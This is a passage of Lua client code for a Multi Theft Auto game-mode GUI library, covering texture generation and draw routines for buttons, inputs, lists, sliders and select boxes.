	-- 	whiteTexture = exports.core:getWhiteTexture()
	-- 	closeTexture = exports.core:getCloseTexture()
	-- 	scrollTexture = exports.core:getScrollTexture()
	-- end)

---SOURCE TEXTURE CLASSES------------------------------------------------------------

	textureSourcesQueue = {}

	function createTextureSource(type, path,  ...)

		local texture = sourceTextures[type]( ... )

		local pixels = dxConvertPixels( dxGetTexturePixels(texture), 'png' )

		if fileExists(path) then
			fileDelete(path)
		end

		local file = fileCreate(path)
		fileWrite(file, pixels)
		fileClose(file)

		destroyElement(texture)

		textureSourcesQueue[path] = {type, path, ...}

		return path

	end

	sourceTextures = {

		shadow = function(source, size, alpha)

			local texture = dxCreateTexture(source)
			local mw,mh = dxGetMaterialSize(texture)

			local tw,th = mw + size*2, mh + size*2
			local target = dxCreateRenderTarget(tw,th, true)

			dxSetRenderTarget(target)

				local s_alpha = alpha
				for i = 1, size do
					dxDrawImage(
						tw/2 - mw/2 - i, th/2 - mh/2 - i,
						mw + i*2, mh + i*2,
						texture, 0, 0, 0, tocolor(255,255,255,s_alpha)
					)

					s_alpha = s_alpha - alpha/size

				end

			dxSetRenderTarget()

			destroyElement(texture)

			return target


		end,

		border_round = function(borderRadius)

			local roundTexture = exports.core:getTexture('round')

			local size = borderRadius*2

			local target = dxCreateRenderTarget(borderRadius, borderRadius, true)

			dxSetRenderTarget(target)

				mta_dxDrawImage(
					-1, -1, size+2, size+2, roundTexture
				)

			dxSetRenderTarget()

			return target

		end,

		bordered_rectangle = function(borderRadius, w, h, corners)

			corners = corners or {true, true, true, true}

			borderRadius = math.floor(borderRadius)
			local corner_texture_path = string.format('__corner_%s_px.png', borderRadius)
			local path = createTextureSource('border_round', corner_texture_path, borderRadius)

			borderRadius=borderRadius*2
			w=w*2
			h=h*2

			local corner_texture = dxCreateTexture(path)
			local mw,mh = dxGetMaterialSize(corner_texture)

			local target = dxCreateRenderTarget(w, h, true)

			dxSetRenderTarget(target)

				mta_dxDrawImage(
					0, 0, mw,mh, corners[2] and corner_texture or whiteTexture,
					0, 0, 0, tocolor(255,255,255,255)
				)

				mta_dxDrawImage(
					0, h-mh, mw,mh, corners[1] and corner_texture or whiteTexture,
					-90, 0, 0, tocolor(255,255,255,255)
				)

				mta_dxDrawImage(
					w-mw, 0, mw,mh, corners[3] and corner_texture or whiteTexture,
					90, 0, 0, tocolor(255,255,255,255)
				)

				mta_dxDrawImage(
					w-mw, h-mh, mw,mh, corners[4] and corner_texture or whiteTexture,
					180, 0, 0, tocolor(255,255,255,255)
				)

				mta_dxDrawRectangle(
					mw - 2, 0, w-mw*2 + 4, h + 2,
					tocolor(255,255,255,255)
				)

				mta_dxDrawRectangle(
					0, mh - 2, w + 2, h-mh*2 + 4,
					tocolor(255,255,255,255)
				)

			dxSetRenderTarget()

			destroyElement(corner_texture)

			return target


		end,

		bordered_empty_rectangle = function(borderRadius, borderWidth, w, h)

			borderRadius = math.floor(borderRadius)
			local corner_texture_path = string.format('__corner_%s_px.png', borderRadius)
			local path = createTextureSource('border_round', corner_texture_path, borderRadius)

			borderRadius=borderRadius*2
			w=w*2
			h=h*2

			local corner_texture = dxCreateTexture(path)
			local mw,mh = dxGetMaterialSize(corner_texture)

			local target = dxCreateRenderTarget(w, h, true)

			dxSetRenderTarget(target)

				mta_dxDrawImage(
					0, 0, mw,mh, corner_texture,
					0, 0, 0, tocolor(255,255,255,255)
				)

				mta_dxDrawImage(
					0, h-mh, mw,mh, corner_texture,
					-90, 0, 0, tocolor(255,255,255,255)
				)

				mta_dxDrawImage(
					w-mw, 0, mw,mh, corner_texture,
					90, 0, 0, tocolor(255,255,255,255)
				)
				mta_dxDrawImage(
					w-mw, h-mh, mw,mh, corner_texture,
					180, 0, 0, tocolor(255,255,255,255)
				)

				mta_dxDrawRectangle(
					mw - 2, 0, w-mw*2 + 4, h + 2,
					tocolor(255,255,255,255)
				)

				mta_dxDrawRectangle(
					0, mh - 2, w + 2, h-mh*2 + 4,
					tocolor(255,255,255,255)
				)

			dxSetRenderTarget()


			local target2 = dxCreateRenderTarget(w, h, true)

			dxSetRenderTarget(target2)

				mta_dxDrawImage(
					borderWidth, borderWidth,
					w - borderWidth*2, h - borderWidth*2,
					target,
					0, 0, 0, 
					tocolor(255,255,255,255)
				)

			dxSetRenderTarget()

			local target2_tex = copyTexture(target2)

			local final = cutTextureByMask( target, {
				mask = target2_tex,
				alpha = 1,
				mode = 1,
			} )

			dxSetRenderTarget(target2, true)

				mta_dxDrawImage(
					0, 0, w,h, final
				)

			dxSetRenderTarget()

			destroyElement(corner_texture)
			destroyElement(target)
			destroyElement(target2_tex)

			return target2


		end,

	}

	function refreshWindowSources()

		setTimer(function()

			for path in pairs( textureSourcesQueue ) do

				createTextureSource( unpack( textureSourcesQueue[path] ) )

				if isElement( curDrawingTextures[path] ) then
					destroyElement( curDrawingTextures[path] )
				end

				-- if not clearGuiTextures then
				-- 	curDrawingTextures[path] = getDrawingTexture(path)
				-- else
					curDrawingTextures[path] = nil
				-- end

			end
			
		end, 100, 1)

	end

	addEventHandler('onClientMinimize', root, function()
		isWindowActive = false
	end)

	function onRestore()

		isWindowctive = true
		refreshWindowSources()
		removeEventHandler('onClientRestore', root, onRestore)

	end
	addEventHandler('onClientRestore', root, onRestore)

---DRAW FUNCTIONS------------------------------------------------------------

	drawFunctions = {

		element = function()
		end,

		image = function(element)

			local path = element[6]

			if not isElement(path) then
				createDrawingTexture(path)
			end

			local drawFunc = dxDrawImage
			if element.mtaDraw then
				drawFunc = mta_dxDrawImage
			end

			local color = element.color or {255,255,255,255}
			if isElement(element[6]) or fileExists(element[6]) then

				local x,y,w,h = getElementAbsoluteOffset(element)
				drawFunc(
					x,y,w,h,
					curDrawingTextures[path] or element[6], element.rot or 0, 0, 0,
					tocolor(
						color[1],color[2],color[3],
						color[4]*windowAlpha
					)
				)
			end
		end,

		button = function(element, id)

			local drawFunc1 = dxDrawImage
			local drawFunc2 = dxDrawText
			local hoverFunc = isMouseInPosition
			if element.mtaDraw then
				drawFunc1 = mta_dxDrawImage
				drawFunc2 = mta_dxDrawText
				hoverFunc = mta_isMouseInPosition
			end

			local animData = element.animData

			local x,y,w,h = getElementAbsoluteOffset(element)

			local eColor = element.color or {255,255,255,255}

			local colorHover = element.activeColor


			local color = {unpack(eColor)}

			if not colorHover then
				colorHover = {
					color[1], color[2], color[3], color[4]
				}
				color[1] = color[1] * 0.8
				color[2] = color[2] * 0.8
				color[3] = color[3] * 0.8
			end

			colorHover[4] = eColor[4]


			if element.bg then

				local hr,hg,hb = interpolateBetween(
					color[1], color[2], color[3],
					colorHover[1], colorHover[2], colorHover[3],
					animData, 'Linear'
				)

				drawFunc1(
					x,y,w,h,
					element.bg, element.rot or 0, 0, 0,
					tocolor(
						hr,hg,hb,
						color[4]*windowAlpha
					)
				)
				if element.activeBg then
					drawFunc1(
						x,y,w,h,
						element.activeBg, element.rot or 0, 0, 0,
						tocolor(
							colorHover[1],colorHover[2],colorHover[3],
							colorHover[4]*animData*windowAlpha
						)
					)
				end



			end

			if element.activeFg then
				local r,g,b = unpack( element.activeFgColor or {255,255,255} )
				drawFunc1(
					x,y,w,h,
					element.activeFg, element.rot or 0, 0, 0,
					tocolor(
						r,g,b,
						animData*eColor[4]*windowAlpha
					)
				)
			end

			local textColor = element.textColor or {255,255,255}
			local activeTextColor = element.activeTextColor or textColor

			local tr,tg,tb = interpolateBetween(
				textColor[1], textColor[2], textColor[3],
				activeTextColor[1], activeTextColor[2], activeTextColor[3],
				animData, 'Linear'
			)

			local text = type(element[6]) == 'function' and (element[6])(element) or element[6]

			drawFunc2(text,
				x,y,
				x+w,y+h,
				tocolor(tr,tg,tb,255*windowAlpha* (color[4]/255) ),
				element.scaleX or (element.scale or 0.9),
				element.scaleY or (element.scale or 0.9),
				element.font or 'default',
				element.alignX or 'center', 'center',
				false, false, false, true
			)
		end,

		clickbox = function(element, id)

			local drawFunc1 = dxDrawImage
			local drawFunc2 = dxDrawText
			local hoverFunc = isMouseInPosition
			if element.mtaDraw then
				drawFunc1 = mta_dxDrawImage
				drawFunc2 = mta_dxDrawText
				hoverFunc = mta_isMouseInPosition
			end

			local animData = element.animData
			local eColor = element.color or {255,255,255,255}

			local colorHover = element.activeColor
			local x,y,w,h = getElementAbsoluteOffset(element)

			local color = {unpack(eColor)}

			if not colorHover then
				colorHover = {
					color[1], color[2], color[3], color[4]
				}
				color[1] = color[1] * 0.8
				color[2] = color[2] * 0.8
				color[3] = color[3] * 0.8
			end

			colorHover[4] = eColor[4]

			if element.bg then

				local hr,hg,hb = interpolateBetween(
					color[1], color[2], color[3],
					colorHover[1], colorHover[2], colorHover[3],
					animData, 'Linear'
				)

				drawFunc1(
					x,y,w,h,
					element.bg, element.rot or 0, 0, 0,
					tocolor(
						hr,hg,hb,
						color[4]*windowAlpha
					)
				)
				if element.activeBg then
					drawFunc1(
						x,y,w,h,
						element.activeBg, element.rot or 0, 0, 0,
						tocolor(
							colorHover[1],colorHover[2],colorHover[3],
							colorHover[4]*animData*windowAlpha
						)
					)
				end
			end

			if element.activeFg then
				local r,g,b = unpack( element.activeFgColor or {255,255,255} )
				drawFunc1(
					x,y,w,h,
					element.activeFg, element.rot or 0, 0, 0,
					tocolor(
						r,g,b,
						animData*eColor[4]*windowAlpha
					)
				)
			end

			local textColor = element.textColor or {255,255,255}
			local activeTextColor = element.activeTextColor or textColor

			local tr,tg,tb = interpolateBetween(
				textColor[1], textColor[2], textColor[3],
				activeTextColor[1], activeTextColor[2], activeTextColor[3],
				animData, 'Linear'
			)

			local text = ((element.values or {})[element.selected or 1] or {}).text

			drawFunc2(text,
				x,y,x+w,y+h,
				tocolor(tr,tg,tb,255*windowAlpha* (color[4]/255) ),
				element.scaleX or (element.scale or 0.9),
				element.scaleY or (element.scale or 0.9),
				element.font or 'default',
				element.alignX or 'center', 'center',
				false, false, false, true
			)
		end,
		rectangle = function(element, id)

			local drawFunc = dxDrawRectangle
			local drawFunc2 = dxDrawImage
			local hoverFunc = isMouseInPosition
			if element.mtaDraw then
				drawFunc = mta_dxDrawRectangle
				drawFunc2 = mta_dxDrawImage
				hoverFunc = mta_isMouseInPosition
			end

			local color = element.color or {255,255,255,255}
			local x,y,w,h = getElementAbsoluteOffset(element)

			if element.activeColor then

				local animData = element.animData

				local alpha = color[4] + ( element.activeColor[4] - color[4] ) * animData
				color = {interpolateBetween(
					color[1], color[2], color[3],
					element.activeColor[1], element.activeColor[2], element.activeColor[3],
					animData, 'InOutQuad')}
				color[4] = alpha

			end

			drawFunc(
				x,y,w,h,
				tocolor(
					color[1],color[2],color[3],
					color[4]*windowAlpha
				)
			)

		end,
		input = function(element, id)


			local drawFunc1 = dxDrawRectangle
			local drawFunc2 = dxDrawImage
			local drawFunc3 = dxDrawText
			if element.mtaDraw then
				drawFunc1 = mta_dxDrawRectangle
				drawFunc2 = mta_dxDrawImage
				drawFunc3 = mta_dxDrawText
			end

			local inputId = id
			local curText = element.placeholder or ''
			local textIsPlaceholder = true
			local hideSymbols = false
			local x,y,w,h = getElementAbsoluteOffset(element)

			if selectedInput == element then
				element.focused = true
				curText = element[6]
				textIsPlaceholder = false
				hideSymbols = element.mask
			else
				element.focused = false
				hideSymbols = element.mask
				if utf8.len(element[6]) > 0 then
					curText = element[6]
					textIsPlaceholder = false
				end

				if element.handleText then
					curText = tostring(element.handleText(curText))
				end
			end

			if hideSymbols then
				if utf8.len(element[6]) > 0 then
					curText = ''
					for i = 1, utf8.len(element[6]) do
						curText = curText .. element.mask
					end
				end
			end

			local color = element.color or {255,255,255,255}

			local bg = element.bg
			if selectedInput == element then

				local r,g,b = unpack(element.activeColor or color)
				color = {r,g,b, element.color[4]}

				bg = element.activeBg or element.bg
			end


			local elementAlpha = color[4]/255

			if element.disabled then
				elementAlpha = elementAlpha * 0.5
			end

			if bg and (type(bg) ~= 'string' or fileExists(bg)) then
				drawFunc2(
					x,y,w,h,
					bg, 0, 0, 0,
					tocolor(
						color[1],color[2],color[3],
						255*elementAlpha*windowAlpha
					)
				)
			end

			local maxTextWidth = element.textAreaWidth or w*0.8
			local iconSize = 0
			if element.icon then
				local iconSize = element.iconSize or h*0.6
				local color = element.iconColor or {255,255,255,255}
				maxTextWidth = maxTextWidth - iconSize - 5

				local ix,iy,iw,ih =
					x + w - iconSize - 10,
					y + h/2 - iconSize/2,
					iconSize,
					iconSize

				element.__icon_coords = {ix,iy,iw,ih}

				drawFunc2(
					ix,iy,iw,ih,
					element.icon, 0, 0, 0,
					tocolor(
						color[1],color[2],color[3],
						color[4]*windowAlpha*elementAlpha
					)
				)
			end

			local scaleX, scaleY = 
				element.scaleX or (element.scale or 0.45),
				element.scaleY or (element.scale or 0.45)


			local color = element.textColor or {255,255,255,255}

			if selectedInput == element then
				color = element.activeTextColor or color
			end

			if textIsPlaceholder then
				color = element.placeholderColor or color
			end

			-- local textScaleMul = 1
			local hCurText = curText
			local textWidth = dxGetTextWidth(curText, scaleX, element.font or 'default')

			while (textWidth + 20) > px(maxTextWidth) do
				hCurText = utf8.sub(hCurText, 2)
				textWidth = dxGetTextWidth(hCurText,
					scaleX, element.font or 'default')
			end

			local alignX = element.alignX or 'left'
			local x1,y1,x2,y2 = x + 20,y,
				w + x - 20 - iconSize,
				y + h

			if alignX == 'center' then
				x1,y1,x2,y2 = x,y, x+w, y+h
			else
				x1 = x1 + (element.textPadding or 0)
			end

			if selectedInput == element then

				local height = h*0.5
				local anim = getAnimData('input-blim')

				if alignX == 'left' then
					local bx,by,bw,bh

					if element.mtaDraw then
						bx,by,bw,bh =
							x + 25 + (element.textPadding or 0) + textWidth,
							y + (h - height)/2,
							2,
							height
					else
						bx,by,bw,bh =
							px(x + 25 + (element.textPadding or 0)) + textWidth,
							px(y + (h - height)/2),
							px(2),
							px(height)
					end
					mta_dxDrawRectangle(
						bx,by,bw,bh,
						tocolor(
							color[1],color[2],color[3],
							color[4]*windowAlpha*elementAlpha*anim
						)
					)
				elseif alignX == 'center' then
					local add = 0
					if textWidth > 0 then
						add = 5
					end

					local bx,by,bw,bh

					if element.mtaDraw then
						bx,by,bw,bh =
							x + textWidth/2 + element[4]/2 + add,
							y + (element[5] - height)/2,
							2, height
					else
						bx,by,bw,bh =
							px(x + w/2 + add) + textWidth/2,
							px(y + (h - height)/2),
							px(2),
							px(height)
					end
					mta_dxDrawRectangle(
						bx,by,bw,bh,
						tocolor(
							color[1],color[2],color[3],
							color[4]*windowAlpha*elementAlpha*anim
						)
					)
				end

			end

			drawFunc3(hCurText,
				x1,y1,x2,y2,
				tocolor(
					color[1],color[2],color[3],
					color[4]*windowAlpha*elementAlpha
				),
				scaleX,scaleY,
				element.font or 'default',
				alignX, 'center',
				false, false, false, false
			)
		end,

		textarea = function(element, id)


			local drawFunc1 = dxDrawRectangle
			local drawFunc2 = dxDrawImage
			local drawFunc3 = dxDrawText
			if element.mtaDraw then
				drawFunc1 = mta_dxDrawRectangle
				drawFunc2 = mta_dxDrawImage
				drawFunc3 = mta_dxDrawText
			end

			local inputId = id
			local curText = element.placeholder or ''
			local textIsPlaceholder = true

			local render_text = utf8.gsub(element.render_text, '\n', '')
			if render_text ~= element[6] then
				element.render_text = element[6]
			end

			local x,y,w,h = getElementAbsoluteOffset(element)

			if selectedInput == element then

				curText = element.render_text
				
				textIsPlaceholder = false
				element.focused = true

			else
				element.focused = false

				if utf8.len(element.render_text) > 0 then
					curText = element.render_text
					textIsPlaceholder = false
				end

				if element.handleText then
					curText = tostring(element.handleText(curText))
				end
			end

			local color = element.color or {255,255,255,255}

			local bg = element.bg
			if selectedInput == element then
				color = element.activeColor or color
				bg = element.activeBg or element.bg
			end

			local elementAlpha = color[4]/255

			if bg and (type(bg) ~= 'string' or fileExists(bg)) then
				drawFunc2(
					x,y,w,h,
					bg, 0, 0, 0,
					tocolor(
						color[1],color[2],color[3],
						color[4]*windowAlpha
					)
				)
			end

			local scaleX, scaleY = 
				element.scaleX or (element.scale or 1),
				element.scaleY or (element.scale or 1)


			local color = element.textColor or {255,255,255,255}

			if selectedInput == element then
				color = element.activeTextColor or color
			end

			if textIsPlaceholder then
				color = element.placeholderColor or color
			end

			local padding = element.padding or 0

			local x,y = x + padding, y + padding

			if selectedInput == element then
				if inputBlim then

					local height = element.fontHeight

					local text = splitString(element.render_text, '\n')
					local offset = (#text-1) * height

					local lastRow = text[#text]
					local width = dxGetTextWidth(lastRow, element.scale, element.font) * sx/real_sx

					local bx,by = x + width + 3, y + offset

					dxDrawRectangle(
						bx,by, 3, height,
						tocolor(
							color[1],color[2],color[3],
							color[4]*windowAlpha*elementAlpha
						)
					)

				end
			end

			drawFunc3(element.render_text,
				x,y,x,y,
				tocolor(
					color[1],color[2],color[3],
					color[4]*windowAlpha*elementAlpha
				),
				scaleX,scaleY,
				element.font or 'default',
				'left', 'top',
				false, false, false, false
			)
		end,

		checkbox = function(element, id)


			local drawFunc1 = dxDrawImage
			local hoverFunc = isMouseInPosition
			if element.mtaDraw then
				drawFunc1 = mta_dxDrawImage
				hoverFunc = mta_isMouseInPosition
			end

			local x,y,w,h = getElementAbsoluteOffset(element)

			element.c_animId = element.c_animId or {}
			local animId = element.c_animId
			local animData = getAnimData(animId)

			if not animData then
				animData = 0
				setAnimData(animId, 0.1, 0)
			end

			animData = getEasingValue(animData, 'InOutQuad')

			if element.checked then
				animate(animId, 1)
			else
				animate(animId, 0)
			end

			local color = element.color or {255,255,255,255}

			local fgColor = element.fgColor or color
			local activeColor = element.activeColor or fgColor

			local r,g,b = interpolateBetween(
				fgColor[1], fgColor[2], fgColor[3],
				activeColor[1], activeColor[2], activeColor[3],
				animData, 'Linear'
			)

			local elementAlpha = color[4]/255
			
			drawFunc1(
				x,y,w,h,
				element.bg or ':core/assets/images/checkbox_bg.png', 0, 0, 0, 
				tocolor(color[1], color[2], color[3],
					color[4]*windowAlpha*elementAlpha)
			)

			local size = element.size or 46
			local padding = (h - size)/2 + (element.padding or 0)

			local x0, xe = x + padding, x + w - padding - size
			local bx = x0 + (xe - x0)*animData

			drawFunc1(
				bx, y + h/2 - size/2,
				size, size,
				element.fg or ':core/assets/images/checkbox_body.png', 0, 0, 0, 
				tocolor(r,g,b,
					color[4]*windowAlpha*elementAlpha)
			)

			local hovered = hoverFunc(x,y,w,h)

			if handleClick and hovered then

				element.checked = not element.checked
				element:callHandler('onCheck', element.checked)
				handleClick = false

			end

		end,

		slider = function(element, id)

			local drawFunc1 = dxDrawImage
			local drawFunc2 = dxDrawImageSection
			if element.mtaDraw then
				drawFunc1 = mta_dxDrawImage
				drawFunc2 = mta_dxDrawImageSection
			end

			local x,y,w,h = getElementAbsoluteOffset(element)

			local color = element.color or {255,255,255,255}
			local activeColor = element.activeColor or color

			local r,g,b,a = unpack(color)
			local ar,ag,ab = unpack(activeColor)

			local sliderColor = element.sliderColor or activeColor
			local sr,sg,sb = unpack(sliderColor)


			local elementAlpha = color[4]/255

			local min, max = unpack(element.range or {0,1})
			local percent = math.clamp((element.value-min)/(max-min), 0, 1)

			local texture = getDrawingTexture(element.bg)
			local mw,mh = dxGetMaterialSize( texture )

			drawFunc2(
				x,y,
				w * percent, h,
				0, 0,
				mw * percent, mh,
				texture,
				0,0,0, tocolor(ar,ag,ab, a*windowAlpha*elementAlpha)
			)

			drawFunc2(
				x + w * percent, y,
				w - w * percent, h,
				mw * percent, 0,
				mw - mw * percent, mh,
				texture,
				0,0,0, tocolor(r,g,b, a*windowAlpha*elementAlpha)
			)

			if element.slider then
				local size = element.sliderSize or (h + 20)
				local x = x + w*percent

				drawFunc1(
					x - size/2, y + h/2 - size/2,
					size, size,
					element.slider, 0, 0, 0, 
					tocolor(sr,sg,sb, a*windowAlpha*elementAlpha)
				)
			end

		end,

		list = function(element, id)

			local drawFunc1 = dxDrawRectangle
			local drawFunc2 = dxDrawImage
			local drawFunc3 = dxDrawText
			local hoverFunc = isMouseInPosition
			if element.mtaDraw then
				drawFunc1 = mta_dxDrawRectangle
				drawFunc2 = mta_dxDrawImage
				drawFunc3 = mta_dxDrawText
				hoverFunc = mta_isMouseInPosition
			end

			local x,y,w,h = getElementAbsoluteOffset(element)

			local color = element.color or {255,255,255,255}

			if element.bg then

				local bgColor = element.bgColor or {255,255,255,255}

				drawFunc2(
					x,y,w,h,
					element.bg, 0,0,0,
					tocolor(bgColor[1], bgColor[2], bgColor[3], bgColor[4]*windowAlpha*(color[4]/255))
				)

			end

			local width,height = w,h
			if not element.renderTarget then
				if not element.mtaDraw then
					width,height = px(width), px(height)
				end

				element.renderTarget = dxCreateRenderTarget(width, height, true)
			end

			local elementHeight = getListAverageElementHeight(element)
			-- local elementHeight = element.listElementHeight or 35
			local elements = element.listElements or {}

			element.listOffset = math.max(
				element.listOffset or 0,
				-#elements
			)
			local offset = element.listOffset or 0

			local activeColor = element.activeColor or color

			local scaleX, scaleY = 
				element.scaleX or (element.scale or 0.45),
				element.scaleY or (element.scale or 0.45)

			element.visibleElements = element.visibleElements or math.floor(h / elementHeight)
			element.visibleElements = math.max(0, element.visibleElements)

			element.l_animId = element.l_animId or {}
			local animId = element.l_animId

			local animY, target = getAnimData(animId)
			if not tonumber(animY) then
				animY = 0
				setAnimData(animId, element.animSpeed or 0.1, 0)
			end

			animate(animId, offset)

			local textPadding = element.textPadding or 0

			local offset_y = -math.floor(animY) + 1
			local elementY = animY*elementHeight

			dxSetBlendMode('modulate_add')

			dxSetRenderTarget(element.renderTarget, true)

				for index = 1, offset_y + element.visibleElements+1 do

					local listElement = elements[index]
					if listElement then

						elementY = math.floor(elementY)

						local dColor = listElement.color or color
						local aColor = listElement.activeColor or activeColor

						listElement.l_animId = listElement.l_animId or {}
						local animId = listElement.l_animId

						animate(animId, element.selectedItem == index and 1 or 0)

						local animData = getAnimData(animId)
						if not tonumber(animData) then
							animData = 0
							setAnimData(animId, 0.1, 0)
						end

						local lec = {interpolateBetween(
							dColor[1], dColor[2], dColor[3],
							aColor[1], aColor[2], aColor[3],
							animData, 'InOutQuad'
						)}

						lec[4] = color[4]

						if elementY > (- (listElement.height or element.listElementHeight) ) and elementY < height then

							if element.lastSelectedItem and element.selectedItem then

								local wrongSelectionFlag

								if element.wrongSelection then
									wrongSelectionFlag = element.wrongSelection(
										element.lastSelectedItem, elements[element.selectedItem])
								else
									wrongSelectionFlag = element.lastSelectedItem ~= elements[element.selectedItem]
								end

								if wrongSelectionFlag then
									element.selectedItem = false
									element.lastSelectedItem = false
								end

							end

							local lElementHovered = hoverFunc(
								x,
								y + elementY,
								w,
								elementHeight
							)
							if not element.noHandleHover and lElementHovered then

								local lx,ly = x,y

								for _, handler in pairs( listElement.clickHandlers or {} ) do
									local hx,hy,hw,hh = unpack(handler.coords or handler.getCoords(
										element,
										0, elementY
									))

									handler.hovered = hoverFunc(
										lx + hx,
										ly + hy,
										hw,
										hh
									)

									if handler.hovered then
										if handleClick then
											if handler.handle then
												handler.handle(listElement, index, element, handler)
												handleClick = false
											end
										end
									end

								end

								if handleClick then

									if not element.noSelection and not listElement.disabled then
										element.selectedItem = index
										element.lastSelectedItem = listElement
										handleClick = false
									end

									if element.onListElementClick then
										element.onListElementClick(element, listElement, index, currentButtonHandle)
										handleClick = false
									end

								end

							else
								for _, handler in pairs( listElement.clickHandlers or {} ) do
									handler.hovered = false
								end
							end

							local text = listElement.text
							if element.getListElementText then
								text = element.getListElementText(element, listElement, index)
							end

							if text then
								for i = 1,2 do
									drawFunc3(text or '',
										0 + textPadding,
										elementY,
										width + textPadding, elementY + elementHeight,
										tocolor(
											lec[1],lec[2],lec[3],
											lec[4]*windowAlpha
										),
										scaleX, scaleY,
										element.font or 'default',
										listElement.alignX or (element.alignX or 'left'), 'center',
										false, true, false, true
									)
								end
							end

							if element.additionalElementDrawing then
								element.additionalElementDrawing(
									listElement, 
									0,
									elementY,
									w,
									listElement.height or element.listElementHeight,
									element, animData, index, lElementHovered

								)
							end

						end

						elementY = elementY + (listElement.height or element.listElementHeight)

					end

				end


			dxSetRenderTarget()

			dxSetBlendMode('blend')

			if isElement(element.renderTarget) then
				dxDrawImage(
					x,y,w,h,
					element.renderTarget,
					0, 0, 0, tocolor(255,255,255,windowAlpha*element.color[4])
				)
			end

			if #elements*elementHeight > height and element.scrollBg then

				element.s_animId = element.s_animId or {}
				local s_animId = element.s_animId

				local scrollHeight = element.scrollHeight or 1

				scrollHeight = element[5] * scrollHeight

				local scrollY = scrollHeight and (
					y + h/2 - scrollHeight/2
				) or y

				scrollY = scrollY + (element.scrollYOffset or 0)

				local scrollColor = element.scrollColor or {255,255,255,255}
				local scrollBgColor = element.scrollBgColor or {255,255,255,255}

				local scrollWidth = element.scrollWidth or 5
				local sHeight = scrollHeight * height / (#elements*elementHeight)
				sHeight = math.max(sHeight, 10)

				local y = scrollY + ((scrollHeight) * (-offset)/#elements )

				y = math.min(y, scrollY + scrollHeight - sHeight)

				element.s_animId = element.s_animId or {}
				local s_animId = element.s_animId

				animate(s_animId, y)

				local animY = getAnimData(s_animId)
				if not tonumber(animY) then
					animY = scrollY
					setAnimData(s_animId, element.animSpeed or 0.1, scrollY)
				end

				local scrollX = x + w + 8 + (element.scrollXOffset or 0)

				drawFunc2(
					scrollX,
					scrollY, scrollWidth, scrollHeight,
					element.scrollBg, 0, 0, 0,
					tocolor(
						scrollBgColor[1],scrollBgColor[2],
						scrollBgColor[3],scrollBgColor[4]*windowAlpha*(color[4]/255)
					)
				)

				drawFunc2(
					scrollX,
					animY, scrollWidth, sHeight,
					element.scrollBg, 0, 0, 0,
					tocolor(
						scrollColor[1],scrollColor[2],
						scrollColor[3],scrollColor[4]*windowAlpha*(color[4]/255)
					)
				)

				if handleClick then


					local s_x,s_y,s_w,s_h = scrollX, scrollY, scrollWidth, scrollHeight

					if not element.mtaDraw then
						s_x,s_y,s_w,s_h = px(s_x), px(s_y), px(s_w), px(s_h)
					end

					if mta_isMouseInPosition(s_x,s_y,s_w,s_h) then

						local x,y = getCursorPosition()
						x,y = x * real_sx, y * real_sy

						x,y = x-s_x, y-s_y

						local yState = y/s_h

						element.listOffset = -(yState * #elements) + element.visibleElements
						element.listOffset = math.min(0, element.listOffset)

						handleClick = false
					end
				end
			end


		end,

		select = function(element, id)

			local drawFunc1 = dxDrawRectangle
			local drawFunc2 = dxDrawText
			local drawFunc3 = dxDrawImage
			local hoverFunc = isMouseInPosition
			if element.mtaDraw then
				drawFunc1 = mta_dxDrawRectangle
				drawFunc2 = mta_dxDrawText
				drawFunc3 = mta_dxDrawImage
				hoverFunc = mta_isMouseInPosition
			end

			local r,g,b,a = unpack(element.color or {255,255,255,255})
			local tr,tg,tb,ta = unpack(element.textColor or {0,0,0,255})

			if element.placeholderColor and not element.selectedItem then
				tr,tg,tb,ta = unpack(element.placeholderColor or {0,0,0,255})
			end

			local x,y,w,h = getElementAbsoluteOffset(element)

			local selectList = element.selectList
			local animData = getAnimData(element.select_animData)
			animData = getEasingValue(animData, 'InOutQuad')

			if element.bg then
				drawFunc3(
					x,y,w,h,
					element.bg,
					0, 0, 0,
					tocolor(r,g,b,a*windowAlpha)
				)			
			else
				drawFunc1(
					x,y,w,h,
					tocolor(r,g,b,a*windowAlpha)
				)
			end

			if element.icon then
				local size = element.iconSize or h*0.8
				local offset = (h - size)/2

				local ir,ig,ib,ia = unpack( element.iconColor or {255,255,255} )
				ia = a

				drawFunc3(
					x + w - size - offset, y + offset,
					size, size,
					element.icon,
					animData*180,
					0, 0, tocolor(ir,ig,ib,ia*windowAlpha)
				)

			end

			local slx, sly, slw, slh = selectList:abs()

			if isElement(element.list_bg) or fileExists(element.list_bg) then
				drawFunc3(
					slx, sly-5, slw, slh+10,
					element.list_bg, 0, 0, 0,
					tocolor(r,g,b,a*animData*windowAlpha)
				)		
			else
				drawFunc1(
					slx, sly-5, slw, slh+10,
					tocolor(r,g,b,a*animData*windowAlpha)
				)	
			end

			local textPadding = (element.alignX or 'left') == 'center' and 0 or 20

			drawFunc2(element.selectedItem and (
				element.getSelectedText and element:getSelectedText() or element.selectedItem.text
			) or element.placeholder,
				x + textPadding, y,
				x + w + textPadding,
				y + h,
				tocolor(tr,tg,tb,ta*windowAlpha),
				element.scale or 1, element.scale or 1,
				element.font or 'default',
				element.alignX, 'center'
			)

			if hoverFunc(x,y,w,h) then

				if handleClick then

					if activeSelect == element then
						animate(activeSelect.select_animData, 0)
						activeSelect = false
					else
						activeSelect = element
						animate(element.select_animData, 1)
					end

				end

			end


		end,
	}

-----INITIALIZE-------------------------------------------------------

	initializeFunctions = {

		list = function(element)

			element.scrollTo = function(element, lElement)

				local x,y,w,h = getElementAbsoluteOffset(element)

				for index, listElement in pairs( element.listElements ) do
					if listElement == lElement then

						local visible = math.floor( h / element.listElementHeight )
						element.listOffset = (
							- ( index-1 ) * element.listElementHeight
							+ ( visible - 1 ) * element.listElementHeight
							- math.abs( math.min( index - visible, 0 ) ) * element.listElementHeight
						) / element.listElementHeight

					end
				end

			end

			element.move = function(element, delta)
			
				local selectedItem = element.selectedItem or 0

				element.selectedItem = cycle( selectedItem + delta, 1, #element.listElements )
				element.lastSelectedItem = element.listElements[element.selectedItem]

				if element.onListElementClick then
					element:onListElementClick(element.lastSelectedItem)
				end

			end


		end,

		select = function(element, elementId, section)

			element.select_animData = element.select_animData or {}
			setAnimData(element.select_animData, element.animSpeed or 1)

			local lHeight = element.listElementHeight or element[5]

			local elementHeight = math.min(
				element.selectHeight or lHeight*4,
				(element.selectHeight or lHeight) * #element.selectElements
			)

			if element.selectList then
				element.selectList.listElements = element.selectElements or {}
			else
				local window = windowModel[section]

				element.selectList = element:addElement(
					{
						'list',
						0, element[5]+10,
						element[4],
						elementHeight,
						scrollBg = element.scrollBg or scrollTexture,
